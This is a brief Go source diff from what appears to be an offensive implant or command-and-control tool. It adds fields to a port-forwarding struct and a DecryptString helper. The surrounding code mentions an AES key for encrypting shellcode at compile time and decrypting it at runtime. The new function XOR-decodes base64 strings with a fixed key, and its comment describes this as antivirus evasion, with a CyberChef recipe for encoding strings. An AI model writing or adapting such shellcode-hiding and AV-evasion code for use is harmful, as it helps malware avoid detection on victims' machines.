@@ -22,10 +22,12 @@ import (
 
 // Forward is the port forwarding struct
 type Forward struct {
-	LPort string
-	RPort string
-	Addr  string
-	Quit  chan bool
+	LPort  string
+	RPort  string
+	Addr   string
+	Quit   chan bool // quit "signal", sets active to false
+	Local  bool
+	Active bool
 }
 
 // AESKEY is used to encrypt shellcode on compiletime & decrypt it at runtime
@@ -255,6 +257,18 @@ func Decrypt(key []byte, text []byte) ([]byte, error) {
 	paddingLen := int(decodedCipherMsg[length-1])
 	result := decodedCipherMsg[:(length - paddingLen)]
 	return result, nil
+}
+
+// DecryptString uses base64 & xor for some very basic av evasion use https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Latin1','string':'XCT'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')
+func DecryptString(cipher string) string {
+	tmp, _ := base64.StdEncoding.DecodeString(cipher)
+	for i := 0; i <= len(tmp)-3; i += 3 {
+		tmp[i] ^= 0x58
+		tmp[i+1] ^= 0x43
+		tmp[i+2] ^= 0x54
+	}
+	clear := string(tmp)
+	return clear
 }
 
 // RemoveIndex ...
